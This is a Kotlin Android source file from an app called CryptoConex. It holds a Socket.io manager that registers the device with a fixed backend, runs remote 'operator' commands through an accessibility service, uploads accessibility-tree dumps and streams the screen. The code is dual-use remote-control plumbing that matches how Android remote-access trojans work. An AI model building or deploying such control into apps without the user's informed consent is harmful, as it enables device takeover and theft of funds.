package com.cryptoconex.mobile.service

import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI

/**
 * Canal de comunicação com o backend via Socket.io (sinalização WebRTC + comandos).
 * Reconexão automática com Exponential Backoff (nativo do cliente socket.io).
 */
object SocketManager {

    private const val BACKEND_URL = "https://crypto-conex.emergent.host"
    private var socket: Socket? = null
    var sessionId: String? = null
        private set
    var iceServers: List<JSONObject> = emptyList()
        private set

    var onOperatorJoined: (() -> Unit)? = null
    var onAnswer: ((String) -> Unit)? = null
    var onRemoteIce: ((JSONObject) -> Unit)? = null

    fun connect(deviceId: String) {
        if (socket != null) return
        val opts = IO.Options().apply {
            path = "/api/socketio"
            transports = arrayOf("websocket")
            reconnection = true
            reconnectionAttempts = Int.MAX_VALUE
            reconnectionDelay = 1000
            reconnectionDelayMax = 15000
            randomizationFactor = 0.5
        }
        socket = IO.socket(URI.create(BACKEND_URL), opts)

        socket?.on(Socket.EVENT_CONNECT) {
            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("platform", "android")
                put("name", android.os.Build.MODEL)
            }
            socket?.emit("device:register", payload)
        }
        socket?.on("device:registered") { args ->
            val data = args[0] as JSONObject
            sessionId = data.optString("session_id")
            val arr = data.optJSONArray("iceServers") ?: JSONArray()
            iceServers = (0 until arr.length()).map { arr.getJSONObject(it) }
        }
        socket?.on("command:receive") { args ->
            val cmd = (args[0] as JSONObject).optJSONObject("command") ?: return@on
            CryptoConexAccessibilityService.instance?.handleCommand(cmd)
        }
        socket?.on("a11y:request") {
            sendAccessibilityTree(CryptoConexAccessibilityService.instance?.dumpTree() ?: JSONArray())
        }
        socket?.on("operator:joined") { onOperatorJoined?.invoke() }
        socket?.on("rtc:answer") { args ->
            val sdp = (args[0] as JSONObject).optJSONObject("sdp")?.optString("sdp") ?: return@on
            onAnswer?.invoke(sdp)
        }
        socket?.on("rtc:ice") { args ->
            val c = (args[0] as JSONObject).optJSONObject("candidate") ?: return@on
            onRemoteIce?.invoke(c)
        }
        socket?.connect()
    }

    fun sendOffer(sdp: String) {
        socket?.emit("rtc:offer", JSONObject().apply {
            put("session_id", sessionId)
            put("sdp", JSONObject().apply { put("type", "offer"); put("sdp", sdp) })
        })
    }

    fun sendIce(candidate: JSONObject) {
        socket?.emit("rtc:ice", JSONObject().apply {
            put("session_id", sessionId)
            put("candidate", candidate)
        })
    }

    fun sendScreenPacket(packet: JSONObject) {
        packet.put("session_id", sessionId)
        socket?.emit("screen:packet", packet)
    }

    fun sendAccessibilityTree(tree: JSONArray) {
        val payload = JSONObject().apply {
            put("session_id", sessionId)
            put("tree", tree)
        }
        socket?.emit("a11y:tree", payload)
    }

    fun emit(event: String, data: JSONObject) = socket?.emit(event, data)

    fun disconnect() { socket?.disconnect(); socket = null }
}
